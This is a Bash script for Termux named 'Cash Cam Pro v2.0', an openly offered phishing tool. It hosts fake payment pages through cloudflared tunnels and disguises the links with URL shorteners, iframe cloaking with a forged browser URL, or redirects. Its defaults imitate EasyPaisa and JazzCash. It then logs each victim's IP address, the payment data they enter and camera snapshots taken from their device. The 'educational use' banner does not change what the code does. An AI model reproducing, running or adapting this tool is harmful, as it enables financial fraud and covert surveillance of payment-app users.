#!/bin/bash
# coded by: ATHEX H4CK3R 🔥
# Cash Cam Pro v2.0 - Payment Gateway Phishing Tool with URL Masking
clear

# Install dependencies
termux-setup-storage
pkg install php -y
pkg install wget -y
pkg install curl -y
pkg install cloudflared -y
clear

trap 'printf "\n";stop' 2

# ============ ANIMATION FUNCTIONS ============

animate_banner() {
    echo -e "\033[?25l"
    local colors=("\e[1;92m" "\e[1;97m" "\e[1;96m" "\e[1;93m" "\e[1;32m" "\e[1;92m")
    local frame=0
    
    while [ $frame -lt 12 ]; do
        clear
        color=${colors[$((RANDOM % ${#colors[@]}))]}
        
        printf "\n\n"
        printf "    ${color}.....................................................................\e[0m\n"
        printf "    ${color}                                                            \e[0m\n"
        printf "    ${color}       ██████╗ █████╗ ███████╗██╗  ██╗     ██████╗ █████╗ ███╗   ███╗\e[0m\n"
        printf "    ${color}      ██╔════╝██╔══██╗██╔════╝██   ██     ██╔════╝██╔══██╗████╗ ████ \e[0m\n"
        printf "    ${color}      ██      ███████ ███████╗███████     ██      ███████ ██╔████╔██ \e[0m\n"
        printf "    ${color}      ██      ██╔══██ ╚════██ ██╔══██     ██      ██╔══██ ██ ╚██╔╝██ \e[0m\n"
        printf "    ${color}      ╚██████╗██   ██ ███████ ██   ██     ╚██████╗██   ██ ██  ╚═╝ ██ \e[0m\n"
        printf "    ${color}       ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝\e[0m\n"
        printf "    ${color}                                                                     \e[0m\n"
        printf "    ${color}                   P R O   E D I T I O N                             \e[0m\n"
        printf "    ${color}.....................................................................\e[0m\n"
        
        sleep 0.08
        ((frame++))
    done
    echo -e "\033[?25h"
}

banner() {
    clear
    printf "\e[0m\n\n"
    
    printf " \e[1;92m   ██████╗ █████╗ ███████╗██╗  ██╗     ██████╗ █████╗ ███╗   ███╗\e[0m\n"
    printf " \e[1;92m  ██╔════╝██╔══██╗██╔════╝██   ██     ██╔════╝██╔══██╗████╗ ████ \e[0m\n"
    printf " \e[1;32m  ██      ███████ ███████╗███████     ██      ███████ ██╔████╔██ \e[0m\n"
    printf " \e[1;32m  ██      ██╔══██ ╚════██ ██╔══██     ██      ██╔══██ ██ ╚██╔╝██ \e[0m\n"
    printf " \e[1;92m  ╚██████╗██   ██ ███████ ██   ██     ╚██████╗██   ██ ██  ╚═╝ ██ \e[0m\n"
    printf " \e[1;92m   ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝\e[0m\n"
    printf "\n"
    printf " \e[1;93m  💰══════════════════════════════════════════════════════💰\e[0m\n"
    printf " \e[1;97m       \e[1;92mCreated By: \e[1;91mA T H E X   \e[1;96mH 4 C K 3 R\e[0m\n"
    printf " \e[1;97m       \e[1;95mTool: \e[1;93mCash Cam Pro v2.0\e[0m\n"
    printf " \e[1;97m       \e[1;96mFeature: \e[1;92mURL Masking + Payment Gateway\e[0m\n"
    printf " \e[1;93m  💰══════════════════════════════════════════════════════💰\e[0m\n"
    printf "\n"
    printf " \e[1;97m  /..........................................................\e[0m\n"
    printf " \e[1;97m     \e[1;92m📱 Payment Phishing + Camera Snap + URL Masking  \e[1;97m \e[0m\n"
    printf " \e[1;97m     \e[1;91m⚠  For Educational Purposes Only!              \e[1;97m \e[0m\n"
    printf " \e[1;97m  /........................................................./\e[0m\n"
    printf "\n"
}

loading() {
    local colors=("\e[1;92m" "\e[1;96m" "\e[1;93m" "\e[1;32m" "\e[1;97m")
    local spin='⣾⣽⣻⢿⡿⣟⣯⣷'
    
    echo -ne "\e[?25l"
    printf "\n    \e[1;97m[\e[1;96m⏳\e[1;97m] \e[1;93m%s \e[0m" "$1"
    
    for i in $(seq 1 12); do
        local color=${colors[$((RANDOM % ${#colors[@]}))]}
        printf "\r    \e[1;97m[\e[1;96m%s\e[1;97m] ${color}%s \e[0m%s" "${spin:$((i % ${#spin})):1}" "$1" "$(printf '▰%.0s' $(seq 1 $i))$(printf '▱%.0s' $(seq $i 12))"
        sleep 0.15
    done
    
    echo -e "\e[?25h"
    printf "\r    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92m%s - Completed!\e[0m\n" "$1"
}

countdown() {
    local sec=$1
    local msg=$2
    
    while [ $sec -gt 0 ]; do
        printf "\r    \e[1;97m[\e[1;96m⏱\e[1;97m] \e[1;95m%s in \e[1;93m%02d\e[1;95m seconds... \e[0m" "$msg" "$sec"
        sleep 1
        ((sec--))
    done
    printf "\r    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mDone!                                    \e[0m\n"
}

stop() {
    printf "\n\n    \e[1;97m[\e[1;91m⛔\e[1;97m] \e[1;91mStopping all processes...\e[0m\n"
    
    for i in $(seq 1 3); do
        printf "\r    \e[1;91m⏹  Terminating"
        for j in $(seq 1 $i); do printf "."; done
        sleep 0.3
    done
    
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkcloudflared=$(ps aux | grep -o "cloudflared" | head -n1)
    
    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
        printf "\r    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mPHP server stopped\e[0m\n"
    fi
    
    if [[ $checkcloudflared == *'cloudflared'* ]]; then
        pkill -f -2 cloudflared > /dev/null 2>&1
        killall -2 cloudflared > /dev/null 2>&1
        printf "\r    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mCloudflared stopped\e[0m\n"
    fi
    
    rm -rf .cld.log sendlink ip.txt mask.html .masked_url.txt 2>/dev/null
    
    printf "\n    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mAll processes terminated!\e[0m\n"
    printf "    \e[1;97m[\e[1;93m👋\e[1;97m] \e[1;93mGoodbye! Stay Ethical!\e[0m\n\n"
    sleep 1
    exit 1
}

dependencies() {
    printf "\n    \e[1;97m/.............................................../\e[0m\n"
    printf "    \e[1;97m  \e[1;96m📦 DEPENDENCY CHECK                    \e[1;97m\e[0m\n"
    printf "    \e[1;97m/.................................................\e[0m\n\n"
    
    command -v php > /dev/null 2>&1 && printf "    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mPHP\e[1;97m - Installed\n" || { printf "    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mPHP\e[1;97m - Not found\n"; loading "Installing PHP"; pkg install php -y > /dev/null 2>&1; }
    command -v cloudflared > /dev/null 2>&1 && printf "    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mCloudflared\e[1;97m - Installed\n" || { printf "    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mCloudflared\e[1;97m - Not found\n"; loading "Installing Cloudflared"; pkg install cloudflared -y > /dev/null 2>&1; }
    command -v wget > /dev/null 2>&1 && printf "    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mWget\e[1;97m - Installed\n" || { printf "    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mWget\e[1;97m - Not found\n"; loading "Installing Wget"; pkg install wget -y > /dev/null 2>&1; }
    command -v curl > /dev/null 2>&1 && printf "    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mCurl\e[1;97m - Installed\n" || { printf "    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mCurl\e[1;97m - Not found\n"; loading "Installing Curl"; pkg install curl -y > /dev/null 2>&1; }
    
    printf "\n    \e[1;97m[\e[1;92m✅\e[1;97m] \e[1;92mAll dependencies ready!\e[0m\n"
}

# ============ URL MASKING FUNCTIONS ============

mask_url_shortener() {
    local original_url="$1"
    local masked_url=""
    
    printf "\n    \e[1;97m/............................................../\e[0m\n"
    printf "    \e[1;97m  \e[1;96m🔗 URL SHORTENER MASKING              \e[1;97m\e[0m\n"
    printf "    \e[1;97m/................................................/\e[0m\n\n"
    
    printf "    \e[1;97m[\e[1;96m1\e[1;97m] \e[1;92mis.gd\e[0m\n"
    printf "    \e[1;97m[\e[1;96m2\e[1;97m] \e[1;92mTinyURL.com\e[0m\n"
    printf "    \e[1;97m[\e[1;96m3\e[1;97m] \e[1;92mcutt.ly\e[0m\n"
    printf "    \e[1;97m[\e[1;96m4\e[1;97m] \e[1;92mdagd.us\e[0m\n\n"
    
    printf "    \e[1;97m[\e[1;96m?\e[1;97m] \e[1;93mSelect shortener [1-4]: \e[0m"
    read -r shortener_option
    
    loading "Generating shortened URL"
    
    case $shortener_option in
        1)
            masked_url=$(curl -s "https://is.gd/create.php?format=simple&url=$original_url" 2>/dev/null)
            ;;
        2)
            masked_url=$(curl -s "https://tinyurl.com/api-create.php?url=$original_url" 2>/dev/null)
            ;;
        3)
            masked_url=$(curl -s "https://cutt.ly/api/api.php?key=public&short=$original_url" 2>/dev/null | grep -o '"shortLink":"[^"]*"' | cut -d'"' -f4)
            ;;
        4)
            masked_url=$(curl -s "https://da.gd/s?url=$original_url" 2>/dev/null)
            ;;
        *)
            masked_url=$(curl -s "https://is.gd/create.php?format=simple&url=$original_url" 2>/dev/null)
            ;;
    esac
    
    if [[ -n "$masked_url" && ${#masked_url} -gt 5 ]]; then
        echo "$masked_url" > .masked_url.txt
        printf "\n    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mMasked URL:\e[1;93m %s\e[0m\n" "$masked_url"
    else
        printf "\n    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mFailed! Using original URL.\e[0m\n"
        echo "$original_url" > .masked_url.txt
    fi
}

mask_url_serveo_subdomain() {
    local original_url="$1"
    
    printf "\n    \e[1;97m/............................................./\e[0m\n"
    printf "    \e[1;97m  \e[1;96m🎭 CUSTOM SUBDOMAIN MASKING           \e[1;97m\e[0m\n"
    printf "    \e[1;97m/.............................................../\e[0m\n\n"
    
    printf "    \e[1;97m[\e[1;96m?\e[1;97m] \e[1;93mEnter custom subdomain name:\e[0m\n"
    printf "    \e[1;97m    Example: \e[1;90measypaisa-verify\e[0m\n"
    printf "    \e[1;97m    Result: \e[1;92measypaisa-verify.serveo.net\e[0m\n\n"
    printf "    \e[1;97m[\e[1;96m→\e[1;97m] \e[1;93mSubdomain: \e[0m"
    read -r custom_subdomain
    
    if [[ -z "$custom_subdomain" ]]; then
        custom_subdomain="easypaisa-verify-$RANDOM"
    fi
    
    masked_url="https://${custom_subdomain}.serveo.net"
    echo "$masked_url" > .masked_url.txt
    
    printf "\n    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mMasked URL:\e[1;93m %s\e[0m\n" "$masked_url"
    printf "    \e[1;97m[\e[1;93m!\e[1;97m] \e[1;93mNote: Requires Serveo tunnel with subdomain option\e[0m\n"
}

mask_url_html_cloak() {
    local original_url="$1"
    
    printf "\n    \e[1;97m...............................................\e[0m\n"
    printf "    \e[1;97m  \e[1;96m🕵️ HTML CLOAKING MASKING               \e[1;97m\e[0m\n"
    printf "    \e[1;97m..................................................\e[0m\n\n"
    
    printf "    \e[1;97m[\e[1;96m?\e[1;97m] \e[1;93mEnter fake URL to show in browser:\e[0m\n"
    printf "    \e[1;97m    Example: \e[1;90mhttps://easypaisa.com.pk/verify\e[0m\n"
    printf "    \e[1;97m    Example: \e[1;90mhttps://jazzcash.com.pk/payment\e[0m\n\n"
    printf "    \e[1;97m[\e[1;96m→\e[1;97m] \e[1;93mFake URL: \e[0m"
    read -r fake_url
    
    if [[ -z "$fake_url" ]]; then
        fake_url="https://easypaisa.com.pk/secure-payment"
    fi
    
    printf "\n    \e[1;97m[\e[1;96m?\e[1;97m] \e[1;93mEnter page title for preview:\e[0m\n"
    printf "    \e[1;97m    Example: \e[1;90mEasyPaisa - Secure Payment\e[0m\n\n"
    printf "    \e[1;97m[\e[1;96m→\e[1;97m] \e[1;93mTitle: \e[0m"
    read -r page_title
    
    if [[ -z "$page_title" ]]; then
        page_title="EasyPaisa - Secure Payment Gateway"
    fi
    
    # Create cloaking HTML page
    cat > mask.html << EOFHTML
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="$page_title">
    <meta property="og:description" content="Fast, Secure & Reliable Payments">
    <meta property="og:image" content="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/icons/cash-stack.svg">
    <meta property="og:url" content="$fake_url">
    <title>$page_title</title>
    <style>
        body { margin:0; padding:0; overflow:hidden; }
        iframe { width:100vw; height:100vh; border:none; position:fixed; top:0; left:0; }
    </style>
    <script>
        // Push fake URL to browser history
        history.pushState({}, "$page_title", "$fake_url");
    </script>
</head>
<body>
    <iframe src="$original_url" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals allow-orientation-lock allow-pointer-lock allow-presentation allow-top-navigation"></iframe>
</body>
</html>
EOFHTML
    
    # Start PHP server for cloak page
    fuser -k 4444/tcp > /dev/null 2>&1
    php -S 127.0.0.1:4444 > /dev/null 2>&1 &
    sleep 2
    
    # Create tunnel for cloak page
    cloudflared tunnel --url http://127.0.0.1:4444 > .cloak_cld.log 2>&1 &
    sleep 8
    
    cloak_link=$(grep -o 'https://[0-9a-z-]*\.trycloudflare\.com' .cloak_cld.log | head -n1)
    
    if [[ -n "$cloak_link" ]]; then
        echo "$cloak_link" > .masked_url.txt
        printf "\n    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mCloaked URL:\e[1;93m %s\e[0m\n" "$cloak_link"
        printf "    \e[1;97m[\e[1;93m!\e[1;97m] \e[1;93mBrowser will show: %s\e[0m\n" "$fake_url"
        printf "    \e[1;97m[\e[1;93m!\e[1;97m] \e[1;93mWhatsApp preview title: %s\e[0m\n" "$page_title"
    else
        printf "\n    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mCloaking failed! Using original URL.\e[0m\n"
        echo "$original_url" > .masked_url.txt
    fi
}

mask_url_custom_redirect() {
    local original_url="$1"
    
    printf "\n    \e[1;97m..............................................\e[0m\n"
    printf "    \e[1;97m  \e[1;96m🔄 CUSTOM REDIRECT MASKING            \e[1;97m\e[0m\n"
    printf "    \e[1;97m..................................................\e[0m\n\n"
    
    # Create PHP redirect with custom path
    mkdir -p mask_redirect 2>/dev/null
    
    cat > mask_redirect/index.php << EOFPHP
<?php
header('Location: $original_url');
exit;
?>
EOFPHP
    
    # Start server for redirect
    fuser -k 5555/tcp > /dev/null 2>&1
    php -S 127.0.0.1:5555 -t mask_redirect/ > /dev/null 2>&1 &
    sleep 2
    
    # Create tunnel
    cloudflared tunnel --url http://127.0.0.1:5555 > .redirect_cld.log 2>&1 &
    sleep 8
    
    redirect_link=$(grep -o 'https://[0-9a-z-]*\.trycloudflare\.com' .redirect_cld.log | head -n1)
    
    if [[ -n "$redirect_link" ]]; then
        echo "$redirect_link" > .masked_url.txt
        printf "\n    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mRedirect URL:\e[1;93m %s\e[0m\n" "$redirect_link"
        printf "    \e[1;97m[\e[1;93m!\e[1;97m] \e[1;93mUse with URL shortener for best results\e[0m\n"
    else
        printf "\n    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mFailed! Using original URL.\e[0m\n"
        echo "$original_url" > .masked_url.txt
    fi
}

# ============ MAIN MASKING MENU ============

url_masking_menu() {
    local original_url="$1"
    
    printf "\n    \e[1;97m/..................................................................../\e[0m\n"
    printf "    \e[1;97m      \e[1;93m🎭 URL MASKING MENU 🎭              \e[1;97m \e[0m\n"
    printf "    \e[1;97m/..................................................................../\e[0m\n"
    printf "    \e[1;97m                                              \e[0m\n"
    printf "    \e[1;97m   \e[1;96m[01] \e[1;92mURL Shortener (is.gd/TinyURL)       \e[1;97m \e[0m\n"
    printf "    \e[1;97m   \e[1;96m[02] \e[1;93mCustom Subdomain (Serveo)           \e[1;97m \e[0m\n"
    printf "    \e[1;97m   \e[1;96m[03] \e[1;95mHTML Cloaking (iFrame Mask)         \e[1;97m \e[0m\n"
    printf "    \e[1;97m   \e[1;96m[04] \e[1;96mCustom Redirect Mask                \e[1;97m \e[0m\n"
    printf "    \e[1;97m   \e[1;96m[05] \e[1;91mNo Masking (Direct Link)            \e[1;97m \e[0m\n"
    printf "    \e[1;97m                                              \e[0m\n"
    printf "    \e[1;97m\e[0m\n"
    
    printf "\n    \e[1;97m[\e[1;96m?\e[1;97m] \e[1;93mSelect masking method [1-5]: \e[0m"
    read -r mask_option
    
    case $mask_option in
        1) mask_url_shortener "$original_url" ;;
        2) mask_url_serveo_subdomain "$original_url" ;;
        3) mask_url_html_cloak "$original_url" ;;
        4) mask_url_custom_redirect "$original_url" ;;
        5) 
            echo "$original_url" > .masked_url.txt
            printf "\n    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mUsing direct link (no masking)\e[0m\n"
            ;;
        *) 
            echo "$original_url" > .masked_url.txt
            printf "\n    \e[1;91m[✗] Invalid option! Using direct link.\e[0m\n"
            ;;
    esac
}

# ============ VICTIM DATA CAPTURE ============

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    
    printf "\n    \e[1;97m/..................................................................../\e[0m\n"
    printf "    \e[1;97m      \e[1;92m🎯 TARGET CONNECTED! 🎯              \e[1;97m \e[0m\n"
    printf "    \e[1;97m\e[0m\n"
    printf "    \e[1;97m      \e[1;96m📱 IP: \e[1;93m%-25s\e[1;97m \e[0m\n" "$ip"
    printf "    \e[1;97m      \e[1;96m🕐 Time: \e[1;93m%-23s\e[1;97m \e[0m\n" "$(date '+%d-%m-%Y %H:%M:%S')"
    printf "    \e[1;97m/..................................................................../\e[0m\n"
    
    echo "=================================" >> captured_data.log
    echo "IP: $ip" >> captured_data.log
    echo "Time: $(date)" >> captured_data.log
    echo "=================================" >> captured_data.log
    cat ip.txt >> saved.ips.txt
}

catch_payment() {
    printf "\n    \e[1;97m/..................................................................../\e[0m\n"
    printf "    \e[1;97m     \e[1;93m💰 PAYMENT DATA CAPTURED! 💰        \e[1;97m \e[0m\n"
    printf "    \e[1;97m/..................................................................../\e[0m\n"
    
    if [[ -f "payments.log" ]]; then
        tail -12 payments.log 2>/dev/null | while IFS= read -r line; do
            printf "    \e[1;97m   \e[1;96m%s\e[0m\n" "$line"
        done
    fi
    
    printf "    \e[1;97m/..................................................................../\e[0m\n"
    echo -e "\a"
}

catch_camera() {
    printf "\n    \e[1;97m/..................................................................../\e[0m\n"
    printf "    \e[1;97m      \e[1;91m📸 CAMERA SNAP CAPTURED! 📸         \e[1;97m \e[0m\n"
    printf "    \e[1;97m/..................................................................../\e[0m\n"
    printf "    \e[1;97m   \e[1;92m✅ Camera image saved                    \e[1;97m \e[0m\n"
    printf "    \e[1;97m   \e[1;93m📁 cam$(date +%d%^b%Y%H%M%S).png              \e[1;97m \e[0m\n"
    printf "    \e[1;97m/..................................................................../\e[0m\n"
    echo -e "\a\a"
}

checkfound() {
    printf "\n  \e[1;97m\e[0m\n"
    printf "    \e[1;97m  \e[1;92m🎯 MONITORING TARGETS...\e[1;97m\e[0m\n"
    printf "    \e[1;97m  \e[1;91mPress Ctrl+C to stop     \e[1;97m\e[0m\n"
    printf "    \e[1;97m\e[0m\n\n"
    
    local anim=0
    local spin='◐◓◑◒'
    local colors=("\e[1;92m" "\e[1;96m" "\e[1;93m" "\e[1;95m")
    local last_payment_size=0
    
    while true; do
        
        if [[ -e "ip.txt" ]]; then
            printf "\r    \e[1;97m[\e[1;92m🎯\e[1;97m] \e[1;92mTarget Opened Link!\e[0m\n"
            catch_ip
            rm -rf ip.txt
            for i in $(seq 1 3); do
                printf "\r    \e[1;92m✨ Target Captured! ✨"; sleep 0.2
                printf "\r    \e[1;93m✨ Target Captured! ✨"; sleep 0.2
            done
            printf "\n"
        fi
        
        if [[ -e "Log.log" ]]; then
            printf "\r    \e[1;97m[\e[1;91m📸\e[1;97m] \e[1;91mCamera Snap Received!\e[0m\n"
            catch_camera
            rm -rf Log.log
        fi
        
        if [[ -e "payments.log" ]]; then
            local new_size=$(wc -c < payments.log 2>/dev/null)
            if [[ -n "$last_payment_size" && "$new_size" != "$last_payment_size" ]]; then
                printf "\r    \e[1;97m[\e[1;93m💰\e[1;97m] \e[1;93mPayment Data Received!\e[0m\n"
                catch_payment
            fi
            last_payment_size="$new_size"
        fi
        
        local color=${colors[$((RANDOM % ${#colors[@]}))]}
        printf "\r    ${color}[%s] \e[1;97mWaiting for targets %s\e[0m" "${spin:$((anim % ${#spin})):1}" "$(printf '.%.0s' $(seq 1 $((anim % 4 + 1))))"
        ((anim++))
        sleep 0.4
    done
}

# ============ SERVER SETUP ============

cloudflared_server() {
    loading "Initializing Cloudflared Tunnel"
    
    fuser -k 3333/tcp > /dev/null 2>&1
    pkill -f cloudflared > /dev/null 2>&1
    sleep 2
    
    loading "Starting PHP Server (Port 3333)"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 3
    
    loading "Creating Secure Tunnel"
    cloudflared tunnel --url http://127.0.0.1:3333 > .cld.log 2>&1 &
    sleep 8
    
    cldflared_link=""
    
    if [ -f .cld.log ]; then
        cldflared_link=$(grep -o 'https://[0-9a-z-]*\.trycloudflare\.com' .cld.log | head -n1)
    fi
    
    if [ -z "$cldflared_link" ]; then
        cldflared_link=$(timeout 8 cloudflared tunnel --url http://127.0.0.1:3333 2>&1 | grep -o 'https://[0-9a-z-]*\.trycloudflare\.com' | head -n1)
    fi
    
    if [ -z "$cldflared_link" ]; then
        cldflared_link=$(grep -o 'https://[0-9a-z-]*\.trycloudflare\.com' .cld.log 2>/dev/null | tail -n1)
    fi
    
    printf "\n  \e[1;97m/............................................................/\e[0m\n"
    printf "    \e[1;97m          \e[1;92m☁️  CLOUDFLARE TUNNEL ACTIVE  ☁️            \e[1;97m \e[0m\n"
    printf "    \e[1;97m/............................................................/\e[0m\n"
    printf "    \e[1;97m                                                              \e[0m\n"
    printf "    \e[1;97m    \e[1;96m🔗 Original URL:\e[0m                             \e[1;97m \e[0m\n"
    printf "    \e[1;97m    \e[1;93m%s\e[0m  \e[1;97m \e[0m\n" "$cldflared_link"
    printf "    \e[1;97m                                                               \e[0m\n"
    
    # Call URL masking menu
    url_masking_menu "$cldflared_link"
    
    masked_url=$(cat .masked_url.txt 2>/dev/null)
    
    if [[ -n "$masked_url" ]]; then
        printf "    \e[1;97m                                                       \e[0m\n"
        printf "    \e[1;97m    \e[1;92m🎭 Masked URL:\e[0m                                    \e[1;97m \e[0m\n"
        printf "    \e[1;97m    \e[1;93m%s\e[0m  \e[1;97m \e[0m\n" "$masked_url"
    fi
    
    printf "    \e[1;97m                                                        \e[0m\n"
    printf "    \e[1;97m    \e[1;92m  Admin Panel:\e[0m                                   \e[1;97m \e[0m\n"
    printf "    \e[1;97m    \e[1;93m%s/panel.html\e[0m  \e[1;97m \e[0m\n" "$cldflared_link"
    printf "    \e[1;97m                                                        \e[0m\n"
    printf "    \e[1;97m    \e[1;91m⚠  Educational Use Only!                          \e[1;97m \e[0m\n"
    printf "    \e[1;97m/............................................................../\e[0m\n"
    
    echo "$cldflared_link" > phishing_link.txt
    echo "Generated: $(date)" >> phishing_link.txt
    
    checkfound
}

# ============ MAIN MENU ============

main_menu() {
    printf "\n    \e[1;97m/..................................................................../\e[0m\n"
    printf "    \e[1;97m      \e[1;92m💰 CASH CAM PRO - MAIN MENU 💰       \e[1;97m \e[0m\n"
    printf "    \e[1;97m/..................................................................../\e[0m\n"
    printf "    \e[1;97m                                              \e[0m\n"
    printf "    \e[1;97m   \e[1;96m[01] \e[1;92mStart Phishing + URL Masking       \e[1;97m \e[0m\n"
    printf "    \e[1;97m   \e[1;96m[02] \e[1;93mView Captured Data                  \e[1;97m \e[0m\n"
    printf "    \e[1;97m   \e[1;96m[03] \e[1;95mClear Logs & Reset                  \e[1;97m \e[0m\n"
    printf "    \e[1;97m   \e[1;96m[04] \e[1;91mExit                                \e[1;97m \e[0m\n"
    printf "    \e[1;97m                                              \e[0m\n"
    printf "    \e[1;97m/..................................................................../\e[0m\n"
    
    printf "\n    \e[1;97m[\e[1;96m?\e[1;97m] \e[1;93mSelect Option [1-4]: \e[0m"
    read -r menu_option
    
    case $menu_option in
        1) start_phishing ;;
        2) view_data ;;
        3) clear_logs ;;
        4) stop ;;
        *) printf "\n    \e[1;91m[✗] Invalid! Try again.\e[0m\n"; sleep 1; main_menu ;;
    esac
}

start_phishing() {
    loading "Preparing Cash Cam Pro Server"
    
    if [[ ! -f "index.php" ]]; then
        printf "\n    \e[1;91m[✗] index.php not found!\e[0m\n"
        sleep 2
        main_menu
    fi
    
    if [[ ! -f "index.html" ]]; then
        printf "\n    \e[1;91m[✗] index.html not found!\e[0m\n"
        sleep 2
        main_menu
    fi
    
    if [[ ! -f "post.php" ]]; then
        printf "\n    \e[1;91m[✗] post.php not found!\e[0m\n"
        sleep 2
        main_menu
    fi
    
    cloudflared_server
}

view_data() {
    clear
    printf "\n  \e[1;97m/......................................................./\e[0m\n"
    printf "    \e[1;97m        \e[1;93m  CAPTURED DATA VIEWER          \e[1;97m \e[0m\n"
    printf "    \e[1;97m/......................................................../\e[0m\n\n"
    
    [[ -f "captured_data.log" ]] && { printf "    \e[1;92m📋 IP Logs:\e[0m\n"; cat captured_data.log; printf "\n"; } || printf "    \e[1;93m[!] No IP data yet.\e[0m\n"
    [[ -f "payments.log" ]] && { printf "    \e[1;92m💰 Payment Data:\e[0m\n"; tail -20 payments.log; printf "\n"; } || printf "    \e[1;93m[!] No payment data yet.\e[0m\n"
    ls cam*.png >/dev/null 2>&1 && { printf "    \e[1;92m📸 Camera Snaps:\e[0m\n"; ls -la cam*.png 2>/dev/null | tail -10; printf "\n"; } || printf "    \e[1;93m[!] No camera snaps yet.\e[0m\n"
    
    printf "\n    \e[1;97m[\e[1;92m↩\e[1;97m] Press Enter to return...\e[0m"
    read -r
    main_menu
}

clear_logs() {
    printf "\n    \e[1;93m[!] Delete all captured data?\e[0m\n"
    printf "    \e[1;97m[\e[1;96m?\e[1;97m] Are you sure? [y/N]: \e[0m"
    read -r confirm
    
    if [[ $confirm == "y" || $confirm == "Y" ]]; then
        rm -rf captured_data.log payments.log Log.log ip.txt saved.ips.txt cam*.png .cld.log .masked_url.txt mask.html mask_redirect/ phishing_link.txt .cloak_cld.log .redirect_cld.log 2>/dev/null
        printf "    \e[1;92m[✓] All logs cleared!\e[0m\n"
    else
        printf "    \e[1;97m[✓] Cancelled.\e[0m\n"
    fi
    
    sleep 1
    main_menu
}

# ============ EXECUTION ============
animate_banner
banner
dependencies
countdown 1 "Initializing Cash Cam Pro"
main_menu